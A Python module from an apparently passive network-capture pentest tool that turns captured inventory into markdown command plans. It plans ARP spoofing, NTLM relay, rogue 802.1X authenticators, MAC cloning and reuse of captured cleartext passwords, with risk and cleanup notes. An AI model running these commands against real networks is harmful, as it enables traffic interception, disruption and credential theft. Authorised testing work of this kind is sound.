"""Offline command generators (issues #13 and #60).

Everything here is **text generation only**. Nothing in this module opens a
socket or sends a packet: it reads the passive inventory and writes commands
that the operator may review and run themselves, with scope checked first.

Two deliverables:

* ``active-commands.md`` — ARP spoofing / relay command generator (#13).
  Commands are never executed; each one carries its risk and cleanup.
* ``serveme.md`` — "serve me" suggestions (#60): for every host and finding,
  what a pentester would try next, with the exact command and why.
"""

from __future__ import annotations

import os
from collections import Counter

BANNER = (
    "> **WARNING — ACTIVE NETWORK TRAFFIC**\n"
    ">\n"
    "> Every command below sends packets. Run them only inside an engagement\n"
    "> with written authorisation and an agreed scope. ARP spoofing can\n"
    "> disrupt production; stop it with the cleanup command shown. PufferRelay\n"
    "> itself is passive and never runs these for you.\n"
)


def _service_ports(host):
    ports = set()
    for service in host.get("services") or []:
        try:
            ports.add(int(service.get("port")))
        except (TypeError, ValueError):
            continue
    return ports


def _guess_gateway(hosts):
    """.1 of the dominant /24 is the usual default gateway; else placeholder."""
    prefixes = Counter()
    for host in hosts:
        ip = host.get("ip") or ""
        if ip.count(".") == 3:
            prefixes[ip.rsplit(".", 1)[0]] += 1
    for prefix, _count in prefixes.most_common():
        candidate = f"{prefix}.1"
        if any(h.get("ip") == candidate for h in hosts):
            return candidate
        return f"{prefix}.1"
    return "<GATEWAY>"


def nac_spoof_plan(inventory, interface="eth0"):
    """Text-only 802.1X/MAB proposals derived from passive NAC observations."""
    rows = inventory.get("nac") or []
    if not rows:
        return None
    identities = sorted(
        {
            row.get("identity")
            for row in rows
            if row.get("identity") and row.get("identity") != "N/A"
        }
    )
    authenticators = sorted(
        {row.get("dst") for row in rows if row.get("dst")}
    )
    return {
        "identity_count": len(identities),
        "authenticator_count": len(authenticators),
        "commands": [
            {
                "tool": "eaphammer",
                "command": (
                    f"sudo eaphammer -i {interface} --auth wpa-eap "
                    "--identity <identity> --cert-wizard"
                ),
                "risk": "rogue authenticator; clients will connect to it",
            },
            {
                "tool": "hostapd-mana",
                "command": f"sudo hostapd-mana /etc/hostapd-mana.conf  # interface {interface}",
                "risk": "evil-twin/EAP relay; can capture MSCHAPv2",
            },
            {
                "tool": "MAB clone",
                "command": (
                    f"sudo macchanger -m <observed-mac> {interface} && "
                    f"sudo ip addr add <observed-ip>/24 dev {interface}"
                ),
                "risk": "impersonates a MAB device; the port may lock out",
            },
        ],
        "cleanup": [
            "sudo pkill hostapd",
            "sudo pkill eaphammer",
            f"sudo macchanger -p {interface}",
            "# remove any temporary IP address you added",
        ],
        "notes": [
            f"{len(identities)} identity(ies) and {len(authenticators)} "
            "authenticator(s) were observed; confirm the port profile before testing.",
            "Keep the test to one authenticator at a time and restore the port after.",
        ],
    }


def arp_spoof_plan(inventory, interface="eth0", gateway=None):
    """Return a reviewable ARP/relay plan derived from the inventory.

    Only hosts that a relay would care about (SMB/LDAP/RDP/WinRM) become
    targets, so the operator does not poison the whole subnet by accident.
    """
    hosts = inventory.get("hosts") or []
    if gateway is None:
        gateway = _guess_gateway(hosts)

    interesting_ports = {445, 139, 389, 636, 3268, 3389, 5985, 5986}
    targets = []
    for host in hosts:
        ip = host.get("ip") or ""
        if not ip or ip == gateway or ip.endswith(".1"):
            continue
        if _service_ports(host) & interesting_ports:
            targets.append(ip)

    commands = []
    for target in targets:
        commands.append(
            {
                "target": target,
                "tool": "arpspoof",
                "command": f"sudo arpspoof -i {interface} -t {target} {gateway}",
                "risk": "poisons the target's gateway entry; traffic may drop",
            }
        )
        commands.append(
            {
                "target": target,
                "tool": "ettercap",
                "command": (
                    f"sudo ettercap -T -q -i {interface} "
                    f"-M arp:remote /{target}// /{gateway}//"
                ),
                "risk": "MITM both directions; can break the target's network",
            }
        )

    relay_commands = [
        {
            "tool": "ntlmrelayx",
            "command": "sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support",
            "risk": "forwards captured NTLM auth; write relay-targets.txt first",
        },
        {
            "tool": "Responder",
            "command": "sudo responder -I %s -wdv" % interface,
            "risk": "answers LLMNR/NBT-NS/MDNS; may poison name resolution",
        },
    ]

    return {
        "interface": interface,
        "gateway": gateway,
        "targets": targets,
        "commands": commands,
        "relay_commands": relay_commands,
        "nac": nac_spoof_plan(inventory, interface=interface),
        "cleanup": [
            "sudo pkill arpspoof",
            "sudo pkill ettercap",
            "sudo pkill -f ntlmrelayx",
            # ARP entries expire; push a corrective update if the target is stuck.
            f"# if a host is stranded: sudo arping -U -c 3 -I {interface} {gateway}",
        ],
        "notes": [
            "Confirm the gateway and scope; do not poison hosts you do not own.",
            "Prefer a single target at a time and stop the spoof as soon as the "
            "capture you need is collected.",
            "Run the cleanup commands even if you think the spoof ended cleanly.",
        ],
    }


def render_arp_plan(plan):
    lines = ["# Active commands — ARP spoof / relay (issue #13)", "", BANNER, ""]
    lines.append(f"Interface: `{plan['interface']}`  ")
    lines.append(f"Gateway: `{plan['gateway']}`  ")
    lines.append(f"Targets: {', '.join(plan['targets']) or '_none identified_'}")
    lines.append("")
    lines.append("## Spoof commands")
    lines.append("")
    if not plan["commands"]:
        lines.append("No relay-relevant target was found in the inventory.")
    for item in plan["commands"]:
        lines.append(f"### {item['target']} ({item['tool']})")
        lines.append("")
        lines.append("```bash")
        lines.append(item["command"])
        lines.append("```")
        lines.append(f"Risk: {item['risk']}")
        lines.append("")
    lines.append("## Relay commands")
    lines.append("")
    for item in plan["relay_commands"]:
        lines.append(f"* {item['tool']}: `{item['command']}` — {item['risk']}")
    lines.append("")
    lines.append("## Cleanup")
    lines.append("")
    lines.append("```bash")
    lines.extend(plan["cleanup"])
    lines.append("```")
    lines.append("")
    nac = plan.get("nac")
    if nac:
        lines.append("## NAC / 802.1X proposals (issue #30)")
        lines.append("")
        lines.append(
            "Passive observations: "
            f"{nac['identity_count']} identity(ies), "
            f"{nac['authenticator_count']} authenticator(s)."
        )
        lines.append("")
        for item in nac["commands"]:
            lines.append(f"* {item['tool']}: `{item['command']}` — {item['risk']}")
        lines.append("")
        lines.append("Cleanup:")
        lines.append("")
        lines.append("```bash")
        lines.extend(nac["cleanup"])
        lines.append("```")
        lines.append("")
        lines.extend(f"* {note}" for note in nac["notes"])
        lines.append("")
    lines.append("## Notes")
    lines.append("")
    lines.extend(f"* {note}" for note in plan["notes"])
    lines.append("")
    return "\n".join(lines)


def _host_command(ip, service):
    port = service.get("port")
    name = (service.get("service") or "").lower()
    if port in (80, 443, 8080, 8443) or name.startswith("http"):
        scheme = "https" if port in (443, 8443) else "http"
        return f"curl -sSk -D- {scheme}://{ip}:{port}/ -o /dev/null"
    if port in (445, 139):
        return f"nxc smb {ip} -u '' -p '' --shares"
    if port in (389, 636, 3268, 3269):
        return f"ldapsearch -x -H ldap://{ip}:{port} -s base -b ''"
    if port == 3389:
        return f"xfreerdp /v:{ip} /cert:ignore /dynamic-resolution"
    if port in (5985, 5986):
        return f"nxc winrm {ip}"
    if port == 21:
        return f"curl -s ftp://{ip}/"
    return f"nmap -sV -p{port} {ip}"


def serve_me_suggestions(inventory):
    """Per-host and per-finding next steps (#60). Text only."""
    suggestions = []
    for host in inventory.get("hosts") or []:
        ip = host.get("ip") or ""
        for service in host.get("services") or []:
            command = _host_command(ip, service)
            suggestions.append(
                {
                    "id": f"HOST-{ip}-{service.get('port')}",
                    "title": f"{ip} — {service.get('service') or 'service'} "
                    f"on {service.get('port')}",
                    "why": "Service observed in the capture; verify version and exposure.",
                    "command": command,
                    "active": True,
                }
            )

    for relay in inventory.get("relays") or []:
        if not relay.get("candidate"):
            continue
        suggestions.append(
            {
                "id": f"RELAY-{relay['destination_ip']}",
                "title": f"Relay candidate {relay['destination_ip']}:"
                f"{relay['destination_port']}",
                "why": "Signing not required; an NTLM relay may succeed.",
                "command": (
                    f"sudo impacket-ntlmrelayx -t smb://{relay['destination_ip']} "
                    "-smb2support"
                ),
                "active": True,
            }
        )

    for credential in inventory.get("credentials") or []:
        if not credential.get("secret"):
            continue
        secret = credential.get("secret") or ""
        command = (
            f"nxc smb {credential['destination_ip']} "
            f"-u '{credential['username']}' -p '{secret}'"
        )
        suggestions.append(
            {
                "id": f"CRED-{credential['username']}",
                "title": f"Reuse {credential['username']} against "
                f"{credential['destination_ip']}",
                "why": f"Credential seen in cleartext over {credential['protocol']}.",
                "command": command,
                "active": True,
            }
        )

    for entry in inventory.get("hashes") or []:
        kind = entry.get("kind") or "hash"
        mode = str(entry.get("hashcat_mode") or ("18200" if "AS-REP" in kind else "5600"))
        suggestions.append(
            {
                "id": f"HASH-{entry.get('username')}",
                "title": f"Crack {entry.get('username')} ({kind or 'hash'})",
                "why": "Offline cracking needs no network access to the target.",
                "command": f"hashcat -m {mode} hashes.txt wordlist.txt",
                "active": False,
            }
        )

    for entry in inventory.get("wsus") or []:
        server = entry.get("destination_ip") or entry.get("host") or ""
        uri = entry.get("uri") or "/"
        suggestions.append(
            {
                "id": f"WSUS-{entry.get('source_ip')}",
                "title": f"WSUS client {entry.get('source_ip')}",
                "why": "Update traffic observed; check the WSUS server posture.",
                "command": f"curl -s http://{server}{uri}",
                "active": True,
            }
        )
    return suggestions


def render_serve_me(suggestions):
    lines = ["# Serve-me suggestions (issue #60)", "", BANNER, ""]
    if not suggestions:
        lines.append("Nothing to suggest: the inventory is empty.")
        return "\n".join(lines) + "\n"
    for item in suggestions:
        marker = "ACTIVE" if item["active"] else "OFFLINE"
        lines.append(f"## {item['title']}  _({marker})_")
        lines.append("")
        lines.append(item["why"])
        lines.append("")
        lines.append("```bash")
        lines.append(item["command"])
        lines.append("```")
        lines.append("")
    return "\n".join(lines)


def write_command_pack(inventory, out_dir, interface="eth0", gateway=None, include=("arp", "serve")):
    """Write the requested files; return the paths that were written."""
    os.makedirs(out_dir, exist_ok=True)
    written = {}
    if "arp" in include:
        plan = arp_spoof_plan(inventory, interface=interface, gateway=gateway)
        arp_path = os.path.join(out_dir, "active-commands.md")
        with open(arp_path, "w", encoding="utf-8", newline="\n") as handle:
            handle.write(render_arp_plan(plan))
        written["active_commands"] = arp_path

    if "serve" in include:
        suggestions = serve_me_suggestions(inventory)
        serve_path = os.path.join(out_dir, "serveme.md")
        with open(serve_path, "w", encoding="utf-8", newline="\n") as handle:
            handle.write(render_serve_me(suggestions))
        written["serveme"] = serve_path
    return written
